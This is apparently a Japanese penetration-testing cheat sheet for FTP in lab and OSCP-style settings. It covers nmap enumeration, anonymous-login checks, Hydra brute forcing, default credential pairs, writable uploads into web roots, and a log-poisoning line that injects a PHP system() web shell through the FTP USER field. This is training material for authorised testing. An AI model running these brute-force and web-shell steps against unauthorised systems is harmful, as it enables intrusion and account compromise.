
## FTP チートシート

> 前提:
> - `target <IP> [NAME]` または `targettmux <IP> [NAME]` 実行済み
> - `$TARGET_IP`, `$OUT`, `$LOG`, `$USERS`, `$PASSES`, `$ROCKYOU` が利用可能
> - 証跡は `~/Vault/Target/<IP>/` に集約
> - > 対象サービス:
> - `21/tcp` FTP
> - `22/tcp` SFTP（別プロトコル。SSHベース）

---

## 0. 開始フロー

### tmux付きで開始
```zsh
targettmux 10.10.10.10 targetname
```

### 初動スキャン

```zsh
scaninit
```

### 結果確認

```zsh
ports-init
ports-serv
nextsvc
```

### Obsidianに反映

```zsh
nextsvc-note
full-note
l2m
```

---

## 1. FTP サービスの存在確認

### service scan から FTP を確認

```zsh
grep -Ei 'ftp' "$OUT/nmap_service.nmap"
```

### open ポート一覧だけ確認

```zsh
ports-serv
```

### 次アクション表示

```zsh
nextsvc
```

> `nextsvc` で FTP が見えたら、まず
>
> * anonymous / ls / get / put
> * writable upload check
>   を見る

---

## 2. FTP 列挙

### 代表的な NSE

```zsh
locate .nse | grep ftp
```

* 利用可能な FTP 関連 NSE スクリプトを確認する
* 追加調査に使えるスクリプトを探す

### 基本列挙

```zsh
nmap -Pn -n -p 21 --script=ftp-anon,ftp-syst "$TARGET_IP" -oA "$OUT/nmap_ftp_basic"
```

* FTP サーバー種別
* OS / バナー情報
* anonymous ログイン可否
* 読み取り可能ファイル
* 書き込み可能領域の有無
* 公開ディレクトリ構成
* 実装のヒント
### サービス別追加確認

```zsh
nmap -Pn -n -p 21 --script=ftp-vsftpd-backdoor "$TARGET_IP" -oA "$OUT/nmap_ftp_vsftpd"
```

* 古い `vsftpd` 実装に関する確認用
* 検証環境でのみ扱う
* 結果は補助情報として扱う

---

## 3. 手動確認

### 標準 FTP 接続

```zsh
ftp "$TARGET_IP"
```

* 手動で FTP 接続
* banner / login prompt / ディレクトリ一覧確認
* ファイル操作の実施

接続後の基本確認:

```text
ls
pwd
binary
passive
get <remote_file>
put <local_file>
mkdir <dir>
delete <file>
bye
```

### ポイント

* `passive` : データ転送不調時に切り替え
* `binary`  : バイナリ転送前に入れる
* 書き込みできるなら Web ルートや公開ディレクトリを疑う

> 注意:
> `sftp` は FTP ではなく SSH 系。`sftp user@$TARGET_IP` は 22/tcp や SSH が見えている時に別サービスとして扱う。

```bash
sftp <user>@"$TARGET_IP"
```

* `SFTP` は SSH ベース
* FTP と別ポート / 別認証方式のことが多い
* FTP が閉じていても SFTP が開いている場合がある

---

## 4. anonymous 確認

### NSE で確認

```zsh
nmap -Pn -n -p 21 --script=ftp-anon "$TARGET_IP" -oA "$OUT/nmap_ftp_anon"
```

### Hydraで確認

```bash
hydra -l "anonymous" -p "" -t 4 -W 3 -f ftp://$TARGET_IP
```
### 手動で確認

```zsh
ftp "$TARGET_IP"
# Name: anonymous
# Password: anonymous
```

確認項目:

```text
- ls できるか
- get できるか
- put できるか
- ディレクトリ移動できるか
- Web 配下に置けそうか
```

---

## 5. 認証確認（許可環境のみ）

### 手元ワードリスト確認

```zsh
cdusers
cdpass
ls -alF
```

### よく使う候補

```zsh
echo "$USERS"
echo "$PASSES"
echo "$ROCKYOU"
```

### Wordlist

```
getlist
```

- getlistは`./wordlist`に使用するﾜｰﾄﾞﾘｽﾄのｼﾝﾎﾞﾘｯｸﾘﾝｸを貼る
- `./wordlist` を使用
### Hydra

```zsh
hydra -L "./wordlist" -P "$PASSWS/password.txt" -t 4 -W 3 -f ftp://"$TARGET_IP"
```

### username が見えている場合

```zsh
hydra -l <user> -P "./wordlist" -t 4 -W 3 -f ftp://"$TARGET_IP"
```

* `-t 4`：負荷制御（安定性）
* `-W 3`：待機（ロックアウト回避）
* `-f`：1件ヒットで停止（OSCP向け）
### empty password / weak credential の確認

#### デフォルト認証

```text
root:root
admin:admin
user:user
test:test
guest:guest
root:toor
admin:password
user:password
```


> 実施時は:
>
> * ラボ/許可環境のみ
> * 回数を抑える
> * まず anonymous, default, reused creds を優先
> * いきなり大規模辞書は後回し

---

## 6. ファイル転送

### FTP クライアントで取得

```text
get <remote_file>
mget *
```

### FTP クライアントでアップロード

```text
put <local_file>
mput *
```

### curl でアップロード

```zsh
curl -T <file> "ftp://$TARGET_IP" --user "<user>:<pass>"
```

### lftp

```zsh
lftp -u <user>,<pass> "$TARGET_IP"
```

### 非対話実行

```zsh
lftp -u <user>,<pass> "$TARGET_IP" -e "ls; put test.txt; bye"
```

### 用途

* 単発ファイル送信
* スクリプトからのアップロード
* 接続確認を兼ねた簡易操作

### 確認ポイント

* 転送成功するか
* 保存先ディレクトリ
* 上書き可否
* 拡張子制限や ACL の有無

---

## 7. Web との連動確認

FTP で書き込めたら確認すること:

```text
- そのディレクトリは Web 公開配下か
- 置いたファイルに HTTP/HTTPS で到達できるか
- 拡張子制限や rename がないか
- upload 後に実行されるか / ただの静的配信か
```

### Web も見えている時

```zsh
nextsvc
```

### vhost / Web 側確認

```zsh
ffuf -u http://$TARGET_IP/FUZZ -w "$DISCOVERY/web-common.txt"
```

### Log Poisoning / RCE

- ユーザー名入力時に以下を送信し、ログファイル等を介してRCE

```zsh
USER <?php system($_REQUEST["c"]." 2>&1");?>
```

---

## 8. フルスキャンとの差分確認

### バックグラウンド full scan の状態確認

```zsh
fullcheck
```

### AutoRecon を追加で回す

```zsh
ar
```

### 初動ポートだけで AutoRecon

```zsh
ar_f_nmap
```

> FTP しか見えていなくても、full scan 後に Web/SSH/高番ポートが出ることがあるので差分確認は必須。

---

## 9. 証跡の残し方

### スクショ

```zsh
fshot
```

### 直近ログを攻略メモへ追記

```zsh
l2m
```

### scan 結果をテンプレへ自動反映

```zsh
scan-note
nextsvc-note
full-note
```

残すべき証跡:

```text
- anonymous login 成功
- ls の結果
- put 成功
- get 成功
- writable directory
- Web 経由で到達できたファイル
- full scan 差分
```

---

## 10. トラブルシュート

### FTP 接続不可

```zsh
ss -tulnp | grep :21
grep -Ei 'ftp' "$OUT/nmap_service.nmap"
```

### 自分の待受や疎通確認

```zsh
vpnip
ss -tulnp | grep <port>
nc -zv "$(vpnip)" <port>
sudo tcpdump -i tun0 port <port>
```

### passive で改善するか

```text
ftp> passive
```

### Python 系ツールが古い場合

```zsh
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

---

## 11. 最低限の判断基準

### 優先度高

```text
1. anonymous login
2. readable files
3. writable upload
4. Web 公開ディレクトリとの連携
5. 他サービスとの credential reuse
6. full scan 差分
```

### 後回し

```text
- 大規模辞書攻撃
- exploit 実行前提の古い PoC
- FTP 単体で根拠の弱い仮説
```

